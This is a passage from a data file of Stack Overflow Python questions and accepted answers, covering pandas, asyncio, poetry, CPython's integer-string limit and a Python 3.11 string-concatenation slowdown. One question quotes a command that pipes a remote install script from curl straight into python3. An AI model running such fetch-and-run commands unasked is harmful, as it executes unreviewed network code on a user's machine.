points\n            for (i, main_player) in df.iterrows():\n                for (j, game_player) in data.iterrows(): # data contains the Game Wise Record dataframe\n                    if main_player['Name'] == game_player['Name']:\n                        main_player['Reward'] += calculatePointsGame(main_player[row['Target']], \n                                                                    row['Min Value'], row['Max Value'], \n                                                                    key, main_player['Position'], row['PCC Reward'], \n                                                                    game_player['Starter'], row['Started'])\n\nThis function works well for the Season Wise Records, but for the Game Wise, I couldn't come up with any Pandas way to do it (eliminating the need of iteration of two Dataframes). I want some way to,\n\nMatch the Rows given in the Game Wise Record file with the Season Wise Record file, based upon the Name attribute\n\nSend the Values from the Game Wise Record to the Custom Function and the Position of the player from the Season Wise Record (so that, only the specific reward is calculated for the player, e.g. if player is QB, so only QB Rewards will be match with him and etc. There are Excel Sheets for each position rewards)\n\nGet the Reward Value back and add it to the Reward in the Season Wise Record against that specific player record.\n\n\nI previously tried to do it by comparing the Name of the Player in the Season Wise Record with the Game Wise Record, but it didn't work. Is there any Pandas way to solve this issue? (where you don't have to iterate all the rows two times)\n",
    "AcceptedAnswerId": 73819986,
    "AcceptedAnswer": "I hope I understood correctly your intentions. To avoid double for loops, you need to use groupby() method and then apply the desired function to every row of the group; finally the aggregation function (sum()) should be applied to the group. Although you can use the Name as a key for grouping, I recommend to add PlayerID.\nThe approach needs little preparation:\ndata = data.join(\n    df.reset_index().set_index(['Name', 'Team'], drop=False)[['index','Position']],\n    on=['Name','Team'],\n    how='left'\n).rename({'index':'PlayerID'}, axis=1)\n\nWe add 2 columns to data DataFrame, namely Position and PlayerID which is the index of the first DataFrame df. We search for the ID checking Name and Team that still may cause a collision (when there 2 players with identical name in the same team).\nWhen it's done the last part of the code will be like this:\nfor key, value in positions.items(): # Positions has a list of all the positions \n    for (_, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position\n        if row['Goal Type'] == 'Season':\n            if row['Target'] in df.columns:\n                df['Reward'] += df.apply(lambda x: calculatePointsSeason(\n                    x[row['Target']], row['Min Value'], row['Games Required'],\n                    row['Max Value'], key, x['Position'],\n                    row['PCC Reward'], x['Games Played']\n                ), axis=1)\n        else: # For Game wise points\n            if row['Target'] in data.columns: # I added these 2 checks because sometimes target is not presented in the columns which raises the error\n                df['Reward'] = df['Reward'].add(\n                    data.groupby('PlayerID').apply(\n                        lambda group: group.apply(lambda game_player: calculatePointsGame(\n                            game_player[row['Target']], \n                            row['Min Value'], row['Max Value'], \n                            key, game_player['Position'],\n                            row['PCC Reward'], \n                            game_player['Starter'],\n                            row['Started']\n                        ), axis=1).sum()\n                    ),\n                    fill_value=0\n                )\n\n"
}
{
    "Id": 73876937,
    "PostTypeId": 1,
    "Title": "What is the difference between keyword pass and ... in python?",
    "Body": "Is there any significant difference between the two Python keywords (...) and (pass) like in the examples\ndef tempFunction():\n    pass \n\nand\ndef tempFunction():\n    ...\n\nI should be aware of?\n",
    "AcceptedAnswerId": 73877007,
    "AcceptedAnswer": "The ... is the shorthand for the Ellipsis global object in python. Similar to None and NotImplemented it can be used as a marker value to indicate the absence of something.\nFor example:\nprint(...)\n# Prints \"Ellipsis\"\n\nIn this case, it has no effect. You could put any constant there and it would do the same. This is valid:\ndef function():\n    1\n\nOr\ndef function():\n    'this function does nothing'\n\nNote both do nothing and return None. Since there is no return keyword the value won't be returned.\npass explicitly does nothing, so it will have the same effect in this case too.\n"
}
{
    "Id": 73597456,
    "PostTypeId": 1,
    "Title": "What is the python-poetry config file after 1.2.0 release?",
    "Body": "I have been using python-poetry for over a year now. \nAfter poetry 1.2.0 release, I get such an info warning:\nConfiguration file exists at ~/Library/Application Support/pypoetry,\nreusing this directory.\n\nConsider moving configuration to ~/Library/Preferences/pypoetry,\nas support for the legacy directory will be removed in an upcoming release.\n\nBut in docs, it is still indicated for macOS: ~/Library/Application Support/pypoetry \nhttps://python-poetry.org/docs/configuration/\nMy question is that if ~/Library/Preferences/pypoetry is the latest decision what should I do for moving configuration to there? \nIs just copy-pasting enough?\n\n",
    "AcceptedAnswerId": 73632457,
    "AcceptedAnswer": "Looks like it is as simple as copy/pasting to the new directory.\nI got the same error after upgrading to Poetry 1.2.  So I created a pypoetry folder in the new Preferences directory, copy/pasted the config.toml to it, and just to be safe, I renamed the original folder to:\n~/Library/Application Support/pypoetry_bak\nAfter doing this and running poetry -V, the error is gone.\n"
}
{
    "Id": 74586892,
    "PostTypeId": 1,
    "Title": "No module named 'keras.saving.hdf5_format'",
    "Body": "After pip3 installing tensorflow and the transformers library, I'm receiving the titular error when I try loading this\nfrom transformers import pipeline\nclassifier = pipeline(\"text-classification\",model='bhadresh-savani/distilbert-base-uncased-emotion')\n\nThe error traceback looks like:\nRuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):\nNo module named 'keras.saving.hdf5_format'\n\n\nI have ensured keras got installed with transformers, so I'm not sure why it isn't working\n",
    "AcceptedAnswerId": 74588082,
    "AcceptedAnswer": "If you are using the latest version of TensorFlow and Keras then you have to try this code and you have got this error as shown below\nRuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):\nNo module named 'keras.saving.hdf5_format'\n\nNow, expand this error traces as I have shown below\n\nNow click on the 14 frames and select as shown below\n\nNow comment this line as shown in the picture below\n\nNow, try this and your error will gone.\nThe problem is that this is in the older version of keras and you are using the latest version of keras. So, you can skip all these steps and go back to the older version and it will work eventually.\n"
}
{
    "Id": 73661082,
    "PostTypeId": 1,
    "Title": "How to generate a certain number of random whole numbers that add up to a certain number and are at least a certain number or more?",
    "Body": "I want to generate 10 whole numbers that add up to 40 and are in the range of 2-6.\nFor example:\n2 + 6 + 2 + 5 + 6 + 2 + 2 + 6 + 3 + 6 = 40\nTen random numbers between 2 and 6 that add up to 40.\n",
    "AcceptedAnswerId": 73661454,
    "AcceptedAnswer": "My idea is to generate numbers in the range of [2,6] until the length of the list is 10 then start checking the sum, if it's not 40 then remove the first element of the list and generate a new number. The only problem is that you might need to check if it's even possible to sum the numbers to your target number, for example it can never reach the target number if it's odd but all the generated numbers are even.\nimport random\n\nlow,high = 2,6\ncount = 10\ntarget = 40\n\nk = []\nr = range(low,high+1)\ntries = 0\nwhile True:\n    k.append(random.choice(r))\n    if len(k) == count:\n        if sum(k) == target:\n            break\n        k = k[1:]\n        tries += 1\n        \nprint(k)\nprint(len(k))\nprint(sum(k))\nprint(tries)\n\n"
}
{
    "Id": 73661849,
    "PostTypeId": 1,
    "Title": "Which specific characters does the strip function remove?",
    "Body": "Here is what you can find in the str.strip documentation:\n\nThe chars argument is a string specifying the set of characters to be removed. If omitted or None, the chars argument defaults to removing whitespace.\n\nNow my question is: which specific characters are considered whitespace?\nThese function calls share the same result:\n>>> ' '.strip()\n''\n>>> '\\n'.strip()\n''\n>>> '\\r'.strip()\n''\n>>> '\\v'.strip()\n''\n>>> '\\x1e'.strip()\n''\n\nIn this related question, a user mentioned that the str.strip function works with a superset of ASCII whitespace characters (in other words, a superset of string.whitespace). More specifically, it works with all unicode whitespace characters.\nMoreover, I believe (but I'm just guessing, I have no proofs) that c.isspace() returns True for each character c that would also be removed by str.strip. Is that correct? If so, I guess one could just run c.isspace() for each unicode character c, and come up with a list of whitespace characters that are removed by default by str.strip.\n>>> ' '.isspace()\nTrue\n>>> '\\n'.isspace()\nTrue\n>>> '\\r'.isspace()\nTrue\n>>> '\\v'.isspace()\nTrue\n>>> '\\x1e'.isspace()\nTrue\n\nIs my assumption correct? And if so, how can I find some proofs? Is there an easier way to know which specific characters are automatically removed by str.strip?\n",
    "AcceptedAnswerId": 73664219,
    "AcceptedAnswer": "The most trivial way to know which characters are removed by str.strip() is to loop over each possible characters and check if a string containing such character gets altered by str.strip():\nc = 0\nwhile True:\n  try:\n    s = chr(c)\n  except ValueError:\n    break\n  if (s != s.strip()):\n    print(f\"{hex(c)} is stripped\", flush=True)\n  c+=1\n\nAs suggested in the comments, you may also print a table to check if str.strip(), str.split() and str.isspace() share the same behaviour about white spaces:\nc = 0\nprint(\"char\\tstrip\\tsplit\\tisspace\")\nwhile True:\n  try:\n    s = chr(c)\n  except ValueError:\n    break\n  stripped = s != s.strip()\n  splitted = not s.split()\n  spaced = s.isspace()\n  if (stripped or splitted or spaced):\n    print(f\"{hex(c)}\\t{stripped}\\t{splitted}\\t{spaced}\", flush=True)\n  c+=1\n\nIf I run the code above I get:\nchar    strip   split   isspace\n0x9     True    True    True\n0xa     True    True    True\n0xb     True    True    True\n0xc     True    True    True\n0xd     True    True    True\n0x1c    True    True    True\n0x1d    True    True    True\n0x1e    True    True    True\n0x1f    True    True    True\n0x20    True    True    True\n0x85    True    True    True\n0xa0    True    True    True\n0x1680  True    True    True\n0x2000  True    True    True\n0x2001  True    True    True\n0x2002  True    True    True\n0x2003  True    True    True\n0x2004  True    True    True\n0x2005  True    True    True\n0x2006  True    True    True\n0x2007  True    True    True\n0x2008  True    True    True\n0x2009  True    True    True\n0x200a  True    True    True\n0x2028  True    True    True\n0x2029  True    True    True\n0x202f  True    True    True\n0x205f  True    True    True\n0x3000  True    True    True\n\nSo, at least in python 3.10.4, your assumption seems to be correct.\n"
}
{
    "Id": 73975798,
    "PostTypeId": 1,
    "Title": "Why does asyncio.wait keep a task with a reference around despite exceeding the timeout?",
    "Body": "I recently found and reproduced a memory leak caused by the use of asyncio.wait. Specifically, my program periodically executes some function until stop_event is set. I simplified my program to the snippet below (with a reduced timeout to demonstrate the issue better):\nasync def main():\n  stop_event = asyncio.Event()\n\n  while True:\n    # Do stuff here\n    await asyncio.wait([stop_event.wait()], timeout=0.0001)\n\nasyncio.run(main())\n\nWhile this looked innocuous to me, it turns out there's a memory leak here. If you execute the code above, you'll see the memory usage growing to hundreds of MBs in a matter of minutes. This surprised me and took a long time to track down. I was expecting that after the timeout, anything I was waiting for would be cleaned up (since I'm not keeping any references to it myself). However, that turns out not to be the case.\nUsing gc.get_referrers, I was able to infer that every time I call asyncio.wait(...), a new task is created that holds a reference to the object returned by stop_event.wait() and that task is kept around forever. Specifically, len(asyncio.all_tasks()) keeps increasing over time. Even if the timeout is passed, the tasks are still there. Only upon calling stop_event.set() do these tasks all finish at once and does memory usage decrease drastically.\nAfter discovering that, this note in the documentation made me try asyncio.wait_for instead:\n\nUnlike wait_for(), wait() does not cancel the futures when a timeout occurs.\n\nIt turns out that actually behaves like I expected. There are no references kept after the timeout, and memory usage and number of tasks stay flat. This is the code without a memory leak:\nasync def main():\n  stop_event = asyncio.Event()\n\n  while True:\n    # Do stuff here\n    try:\n      await asyncio.wait_for(event.stop_event(), timeout=0.0001)\n    except asyncio.TimeoutError:\n      pass\n\nasyncio.run(main())\n\nWhile I'm happy this is fixed now, I don't really understand this behavior. If the timeout has been exceeded, why keep this task holding a reference around? It seems like that's a recipe for creating memory leaks. The note about not cancelling futures is also not clear to me. What if we don't explicitly cancel the future, but we just don't keep a task holding a reference after the timeout? Wouldn't that work as well?\nIt would be very much appreciated if anybody could shine some light on this. Thanks a lot!\n",
    "AcceptedAnswerId": 74003884,
    "AcceptedAnswer": "The key concept to understand here is that the return value of wait() is a tuple (completed, pending) tasks.\nThe typical way to use wait()-based code is like this:\nasync def main():\n    stop_event = asyncio.Event()\n\n    pending = [... add things to wait ...]\n\n    while pending:\n        completed, pending = await asyncio.wait(pending, timeout=0.0001)\n\n        process(completed) # e.g. update progress bar\n\n        pending.extend(more_tasks_to_wait)\n\nwait() with timeout isn't used to have one coroutine to wait for another coroutines/tasks to finish, instead its primary use case is for periodically flushing completed tasks, while letting the unfinished tasks to continue \"in the background\", so cancelling the unfinished tasks automatically isn't really desirable, because you usually want to continue waiting for those pending tasks again in the next iteration.\nThis usage pattern resembles the select() system call.\nOn the other hand, the usage pattern of await wait_for(xyz, ) is basically just like doing await xyz with a timeout. It's a common and much simpler use case.\n"
}
{
    "Id": 74091600,
    "PostTypeId": 1,
    "Title": "ASGI_APPLICATION not working with Django Channels",
    "Body": "I followed the tutorial in the channels documentation but when I start the server python3 manage.py runserver it gives me this :\nWatching for file changes with StatReloader\nPerforming system checks...\n\nSystem check identified no issues (0 silenced).\nOctober 17, 2022 - 00:13:21\nDjango version 4.1.2, using settings 'config.settings'\nStarting development server at http://127.0.0.1:8000/\nQuit the server with CONTROL-C.\n\nwhen I expected for it to give me this :\nWatching for file changes with StatReloader\nPerforming system checks...\n\nSystem check identified no issues (0 silenced).\nOctober 17, 2022 - 00:13:21\nDjango version 4.1.2, using settings 'config.settings'\nStarting ASGI/Channels version 3.0.5 development server at http://127.0.0.1:8000/\nQuit the server with CONTROL-C.\n\nsettings.py\nINSTALLED_APPS = [\n    'channels',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    ...\n]\n\nASGI_APPLICATION = 'config.asgi.application'\n\nasgi.py\nimport os\nfrom django.core.asgi import get_asgi_application\nfrom channels.routing import ProtocolTypeRouter\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')\n\napplication = ProtocolTypeRouter({\n    'http': get_asgi_application(),\n})\n\nIt doesn't give any errors even when I change the ASGI_APPLICATION = 'config.asgi.application to ASGI_APPLICATION = ''.\n",
    "AcceptedAnswerId": 74108598,
    "AcceptedAnswer": "This could be due to the fact that the Django and channels versions you have used are not compatible\nTry : channels==3.0.4 and django==4.0.0\n"
}
{
    "Id": 74599713,
    "PostTypeId": 1,
    "Title": "Merge two dictionaries in python",
    "Body": "I'm trying to merge two dictionaries based on key value. However, I'm not able to achieve it. Below is the way I tried solving.\ndict1 = {4: [741, 114, 306, 70],\n         2: [77, 325, 505, 144],\n         3: [937, 339, 612, 100],\n         1: [52, 811, 1593, 350]}\ndict2 = {1: 'A', 2: 'B', 3: 'C', 4: 'D'}\n\nMy resultant dictionary should be\noutput = {'D': [741, 114, 306, 70],\n          'B': [77, 325, 505, 144],\n          'C': [937, 339, 612, 100],\n          'A': [52, 811, 1593, 350]}\n\nMy code\ndef mergeDictionary(dict_obj1, dict_obj2):\n    dict_obj3 = {**dict_obj1, **dict_obj2}\n    for key, value in dict_obj3.items():\n        if key in dict_obj1 and key in dict_obj2:\n               dict_obj3[key] = [value , dict_obj1[key]]\n    return dict_obj3\n\ndict_3 = mergeDictionary(dict1, dict2)\n\nBut I'm getting this as output\ndict_3={4: ['D', [741, 114, 306, 70]], 2: ['B', [77, 325, 505, 144]], 3: ['C', [937, 339, 612, 100]], 1: ['A', [52, 811, 1593, 350]]}\n\n",
    "AcceptedAnswerId": 74599751,
    "AcceptedAnswer": "Use a simple dictionary comprehension:\noutput = {dict2[k]: v for k,v in dict1.items()}\n\nOutput:\n{'D': [741, 114, 306, 70],\n 'B': [77, 325, 505, 144],\n 'C': [937, 339, 612, 100],\n 'A': [52, 811, 1593, 350]}\n\n"
}
{
    "Id": 73693104,
    "PostTypeId": 1,
    "Title": "Python 3.10.7 - ValueError: Exceeds the limit (4300) for integer string conversion",
    "Body": "\n>>> import sys\n>>> sys.set_int_max_str_digits(4300)  # Illustrative, this is the default.\n>>> _ = int('2' * 5432)\nTraceback (most recent call last):\n...\nValueError: Exceeds the limit (4300) for integer string conversion: value has 5432 digits.\n\n\nPython 3.10.7 introduced this breaking change for type conversion.\nDocumentation: Integer string conversion length limitation\nActually I don't understand why\n\nthis was introduced and\nwhere does the default value of 4300 come from? Sounds like an arbitrary number.\n\n",
    "AcceptedAnswerId": 73693178,
    "AcceptedAnswer": "See github issue CVE-2020-10735: Prevent DoS by large intstr conversions #95778:\n\nProblem\nA Denial Of Service (DoS) issue was identified in CPython\nbecause we use binary bignum\u2019s for our int implementation. A huge\ninteger will always consume a near-quadratic amount of CPU time in\nconversion to or from a base 10 (decimal) string with a large number\nof digits. No efficient algorithm exists to do otherwise.\nIt is quite common for Python code implementing network protocols and\ndata serialization to do int(untrusted_string_or_bytes_value) on input\nto get a numeric value, without having limited the input length or to\ndo log(\"processing thing id %s\", unknowingly_huge_integer) or any\nsimilar concept to convert an int to a string without first checking\nits magnitude. (http, json, xmlrpc, logging, loading large values into\ninteger via linear-time conversions such as hexadecimal stored in\nyaml, or anything computing larger values based on user controlled\ninputs\u2026 which then wind up attempting to output as decimal later on).\nAll of these can suffer a CPU consuming DoS in the face of untrusted\ndata.\nEveryone auditing all existing code for this, adding length guards,\nand maintaining that practice everywhere is not feasible nor is it\nwhat we deem the vast majority of our users want to do.\nThis issue has been reported to the Python Security Response Team\nmultiple times by a few different people since early 2020, most\nrecently a few weeks ago while I was in the middle of polishing up the\nPR so it\u2019d be ready before 3.11.0rc2.\nMitigation\nAfter discussion on the Python Security Response Team\nmailing list the conclusion was that we needed to limit the size of\ninteger to string conversions for non-linear time conversions\n(anything not a power-of-2 base) by default. And offer the ability to\nconfigure or disable this limit.\nThe Python Steering Council is aware of this change and accepts it as\nnecessary.\n\nFurther discussion can be found on the Python Core Developers Discuss thread Int/str conversions broken in latest Python bugfix releases.\nI found this comment by Steve Dower to be informative:\n\nOur apologies for the lack of transparency in the process here. The\nissue was first reported to a number of other security teams, and\nconverged in the Python Security Response Team where we agreed that\nthe correct fix was to modify the runtime.\nThe delay between report and fix is entirely our fault. The security\nteam is made up of volunteers, our availability isn\u2019t always reliable,\nand there\u2019s nobody \u201cin charge\u201d to coordinate work. We\u2019ve been\ndiscussing how to improve our processes. However, we did agree that\nthe potential for exploitation is high enough that we didn\u2019t want to\ndisclose the issue without a fix available and ready for use.\nWe did work through a number of alternative approaches, implementing\nmany of them. The code doing int(gigabyte_long_untrusted_string) could\nbe anywhere inside a json.load or HTTP header parser, and can run very\ndeep. Parsing libraries are everywhere, and tend to use int\nindiscriminately (though they usually handle ValueError already).\nExpecting every library to add a new argument to every int() call\nwould have led to thousands of vulnerabilities being filed, and made\nit impossible for users to ever trust that their systems could not be\nDoS\u2019d.\nWe agree it\u2019s a heavy hammer to do it in the core, but it\u2019s also the\nonly hammer that has a chance of giving users the confidence to keep\nrunning Python at the boundary of their apps.\nNow, I\u2019m personally inclined to agree that int->str conversions should\ndo something other than raise. I was outvoted because it would break\nround-tripping, which is a reasonable argument that I accepted. We can\nstill improve this over time and make it more usable. However, in most\ncases we saw, rendering an excessively long string isn\u2019t desirable\neither. That should be the opt-in behaviour.\nRaising an exception from str may prove to be too much, and could be\nreconsidered, but we don\u2019t see a feasible way to push out updates to\nevery user of int, so that will surely remain global.\n\n"
}
{
    "Id": 73708478,
    "PostTypeId": 1,
    "Title": "The git (or python) command requires the command line developer tools",
    "Body": "This knowledge post isn't a duplication of other similar ones, since it's related to 12/September/2022 Xcode update, which demands a different kind of solution\nI have come to my computer today and discovered that nothing runs on my terminal Every time I have opened my IDE (VS Code or PyCharm), it has given me this message in the start of the terminal.\nI saw so many solutions, which have said to uninstall pyenv and install python via brew, which was a terrible idea, because I need different python versions for different projects.\nAlso, people spoke a lot about symlinks, which as well did not make any sense, because everything was working until yesterday.\nFurthermore, overwriting .oh-my-zsh with a new built one did not make any difference.\n",
    "AcceptedAnswerId": 73709260,
    "AcceptedAnswer": "I was prompted to reinstall commandLine tools over and over when trying to accept the terms\nI FIXED this by opening xcode and confirming the new update information\n"
}
{
    "Id": 72401377,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects",
    "Body": "I'm trying to install pandas via pip install pandas on my laptop.\nEnvironment:\n\nWindow 11 Pro\nPython 3.10.4\nPip version 22.0.4\n\nCompatibility:\n\nOfficially Python 3.8, 3.9 and 3.10.\nYou must have pip>=19.3 to install from PyPI.\n\n\nC:\\Users\\PC>pip install pandas\nWARNING: Ignoring invalid distribution -ywin32 (c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages)\nWARNING: Ignoring invalid distribution -ywin32 (c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages)\nCollecting pandas\n  Using cached pandas-1.4.2.tar.gz (4.9 MB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nRequirement already satisfied: numpy>=1.21.0 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from pandas) (1.22.4)\nRequirement already satisfied: python-dateutil>=2.8.1 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from pandas) (2.8.2)\nCollecting pytz>=2020.1\n  Using cached pytz-2022.1-py2.py3-none-any.whl (503 kB)\nRequirement already satisfied: six>=1.5 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from python-dateutil>=2.8.1->pandas) (1.16.0)\nBuilding wheels for collected packages: pandas\n  Building wheel for pandas (pyproject.toml) ... error\n  error: subprocess-exited-with-error\n\n  \u00d7 Building wheel for pandas (pyproject.toml) did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [2010 lines of output]\n      C:\\Users\\PC\\AppData\\Local\\Temp\\pip-build-env-q3kdt5nb\\overlay\\Lib\\site-packages\\setuptools\\config\\setupcfg.py:459: SetuptoolsDeprecationWarning: The license_file parameter is deprecated, use license_files instead.\n        warnings.warn(msg, warning_class)\n\n\n...\n\n\n  note: This error originates from a subprocess, and is likely not a problem with pip.\n  ERROR: Failed building wheel for pandas\nFailed to build pandas\nERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects\n\nWhat I have tried:\n\nupdated pip to 22.1.1\ninstalled wheel 0.37.1\nuninstalled and installed pip\nuninstalled and installed python 3.10.4\n\n\nError still reproducible with pandas 1.5.1\n\nThanks to @AKX which has pointed up that there is no and may will no 32-bit version of pandas in the future. See the discussion on GitHub.\n",
    "AcceptedAnswerId": 74277465,
    "AcceptedAnswer": "Pandas doesn't require Anaconda to work, but based on python310-32 in your output, you're using a 32-bit build of Python.\nPandas evidently does not ship 32-bit wheels for Python 3.10 (they do have win32 wheels for Python 3.8 and Python 3.9 though). (There could be alternate sources for pre-built 32-bit wheels, such as Gohlke's site.)\nIn other words, on that platform you would need to install Pandas from source, which will likely be a rather difficult undertaking, and can't be done directly within pip anyway (as you noticed via error: metadata-generation-failed).\nIf your system is capable of running 64-bit Python, you should switch to it.\n"
}
{
    "Id": 73805879,
    "PostTypeId": 1,
    "Title": "poetry installation failing on Mac OS, says \"should_use_symlinks\"",
    "Body": "I am trying to install poetry using the following command\ncurl -sSL https://install.python-poetry.org | python3 -\n\nbut it is failing with the following exception:\nException: This build of python cannot create venvs without using symlinks\nBelow is the text detailing the error\nRetrieving Poetry metadata\n\n# Welcome to Poetry!\n\nThis will download and install the latest version of Poetry,\na dependency and package manager for Python.\n\nIt will add the `poetry` command to Poetry's bin directory, located at:\n\n/Users/DaftaryG/.local/bin\n\nYou can uninstall at any time by executing this script with the --uninstall option,\nand these changes will be reverted.\n\nInstalling Poetry (1.2.1): Creating environment\nTraceback (most recent call last):\n  File \"\", line 940, in \n  File \"\", line 919, in main\n  File \"\", line 550, in run\n  File \"\", line 571, in install\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/contextlib.py\", line 117, in __enter__\n    return next(self.gen)\n  File \"\", line 643, in make_env\n  File \"\", line 629, in make_env\n  File \"\", line 309, in make\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py\", line 66, in __init__\n    self.symlinks = should_use_symlinks(symlinks)\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py\", line 31, in should_use_symlinks\n    raise Exception(\"This build of python cannot create venvs without using symlinks\")\nException: This build of python cannot create venvs without using symlinks\n\nI already have symlinks installed so not having that does not seem to be the problem. Would anyone know the cause of this error?\n",
    "AcceptedAnswerId": 73834174,
    "AcceptedAnswer": "Not the best solution, but you can install it using Homebrew, if you have it. That's what I did.\nbrew install poetry\n\n"
}
{
    "Id": 74605279,
    "PostTypeId": 1,
    "Title": "Python 3.11 worse optimized than 3.10?",
    "Body": "I run this simple loop with Python 3.10.7 and 3.11.0 on Windows 10.\nimport time\na = 'a'\n\nstart = time.time()\nfor _ in range(1000000):\n    a += 'a'\nend = time.time()\n\nprint(a[:5], (end-start) * 1000)\n\nThe older version executes in 187ms, Python 3.11 needs about 17000ms. Does 3.10 realize that only the first 5 chars of a are needed, whereas 3.11 executes the whole loop? I confirmed this performance difference on godbolt.\n",
    "AcceptedAnswerId": 74607850,
    "AcceptedAnswer": "TL;DR: you should not use such a loop in any performance critical code but ''.join instead. The inefficient execution appears to be related to a regression during the bytecode generation in CPython 3.11 (and missing optimizations during the evaluation of binary add operation on Unicode strings).\n\nGeneral guidelines\nThis is an antipattern. You should not write such a code if you want this to be fast. This is described in PEP-8:\n\nCode should be written in a way that does not disadvantage other implementations of Python (PyPy, Jython, IronPython, Cython, Psyco, and such). \nFor example, do not rely on CPython\u2019s efficient implementation of in-place string concatenation for statements in the form a += b or a = a + b. This optimization is fragile even in CPython (it only works for some types) and isn\u2019t present at all in implementations that don\u2019t use refcounting. In performance sensitive parts of the library, the ''.join() form should be used instead. This will ensure that concatenation occurs in linear time across various implementations.\n\nIndeed, other implementations like PyPy does not perform an efficient in-place string concatenation for example. A new bigger string is created for every iteration (since strings are immutable, the previous one may be referenced and PyPy does not use a reference counting but a garbage collector). This results in a quadratic runtime as opposed to a linear runtime in CPython (at least in past implementation).\n\nDeep Analysis\nI can reproduce the problem on Windows 10 between the embedded (64-bit x86-64) version of CPython 3.10.8 and the one of 3.11.0:\nTimings:\n - CPython 3.10.8:    146.4 ms\n - CPython 3.11.0:  15186.8 ms\n\nIt turns out the code has not particularly changed between CPython 3.10 and 3.11 when it comes to Unicode string appending. See for example PyUnicode_Append: 3.10 and 3.11.\nA low-level profiling analysis shows that nearly all the time is spent in one unnamed function call of another unnamed function called by PyUnicode_Concat (which is also left unmodified between CPython 3.10.8 and 3.11.0). This slow unnamed function contains a pretty small set of assembly instructions and nearly all the time is spent in one unique x86-64 assembly instruction: rep movsb byte ptr [rdi], byte ptr [rsi]. This instruction is basically meant to copy a buffer pointed by the rsi register to a buffer pointed by the rdi register (the processor copy rcx bytes for the source buffer to the destination buffer and decrement the rcx register for each byte until it reach 0). This information shows that the unnamed function is actually memcpy of the standard MSVC C runtime (ie. CRT) which appears to be called by _copy_characters itself called by _PyUnicode_FastCopyCharacters of PyUnicode_Concat (all the functions are still belonging to the same file). However, these CPython functions are still left unmodified between CPython 3.10.8 and 3.11.0. The non-negligible time spent in malloc/free (about 0.3 seconds) seems to indicate that a lot of new string objects are created -- certainly at least 1 per iteration -- matching with the call to PyUnicode_New in the code of PyUnicode_Concat. All of this indicates that a new bigger string is created and copied as specified above.\nThe thing is calling PyUnicode_Concat is certainly the root of the performance issue here and I think CPython 3.10.8 is faster because it certainly calls PyUnicode_Append instead. Both calls are directly performed by the main big interpreter evaluation loop and this loop is driven by the generated bytecode.\nIt turns out that the generated bytecode is different between the two version and it is the root of the performance issue. Indeed, CPython 3.10 generates an INPLACE_ADD bytecode instruction while CPython 3.11 generates a  BINARY_OP bytecode instruction. Here is the bytecode for the loops in the two versions:\nCPython 3.10 loop:\n\n        >>   28 FOR_ITER                 6 (to 42)\n             30 STORE_NAME               4 (_)\n  6          32 LOAD_NAME                1 (a)\n             34 LOAD_CONST               2 ('a')\n             36 INPLACE_ADD                             <----------\n             38 STORE_NAME               1 (a)\n             40 JUMP_ABSOLUTE           14 (to 28)\n\nCPython 3.11 loop:\n\n        >>   66 FOR_ITER                 7 (to 82)\n             68 STORE_NAME               4 (_)\n  6          70 LOAD_NAME                1 (a)\n             72 LOAD_CONST               2 ('a')\n             74 BINARY_OP               13 (+=)         <----------\n             78 STORE_NAME               1 (a)\n             80 JUMP_BACKWARD            8 (to 66)\n\nThis changes appears to come from this issue. The code of the main interpreter loop (see ceval.c) is different between the two CPython version. Here are the code executed by the two versions:\n        // In CPython 3.10.8\n        case TARGET(INPLACE_ADD): {\n            PyObject *right = POP();\n            PyObject *left = TOP();\n            PyObject *sum;\n            if (PyUnicode_CheckExact(left) && PyUnicode_CheckExact(right)) {\n                sum = unicode_concatenate(tstate, left, right, f, next_instr); // <-----\n                /* unicode_concatenate consumed the ref to left */\n            }\n            else {\n                sum = PyNumber_InPlaceAdd(left, right);\n                Py_DECREF(left);\n            }\n            Py_DECREF(right);\n            SET_TOP(sum);\n            if (sum == NULL)\n                goto error;\n            DISPATCH();\n        }\n\n//----------------------------------------------------------------------------\n\n        // In CPython 3.11.0\n        TARGET(BINARY_OP_ADD_UNICODE) {\n            assert(cframe.use_tracing == 0);\n            PyObject *left = SECOND();\n            PyObject *right = TOP();\n            DEOPT_IF(!PyUnicode_CheckExact(left), BINARY_OP);\n            DEOPT_IF(Py_TYPE(right) != Py_TYPE(left), BINARY_OP);\n            STAT_INC(BINARY_OP, hit);\n            PyObject *res = PyUnicode_Concat(left, right); // <-----\n            STACK_SHRINK(1);\n            SET_TOP(res);\n            _Py_DECREF_SPECIALIZED(left, _PyUnicode_ExactDealloc);\n            _Py_DECREF_SPECIALIZED(right, _PyUnicode_ExactDealloc);\n            if (TOP() == NULL) {\n                goto error;\n            }\n            JUMPBY(INLINE_CACHE_ENTRIES_BINARY_OP);\n            DISPATCH();\n        }\n\nNote that unicode_concatenate calls PyUnicode_Append (and do some reference counting checks before). In the end, CPython 3.10.8 calls PyUnicode_Append which is fast (in-place) and CPython 3.11.0 calls PyUnicode_Concat which is slow (out-of-place). It clearly looks like a regression to me.\nPeople in the comments reported having no performance issue on Linux. However, experimental tests shows a BINARY_OP instruction is also generated on Linux, and I cannot find so far any Linux-specific optimization regarding string concatenation. Thus, the difference between the 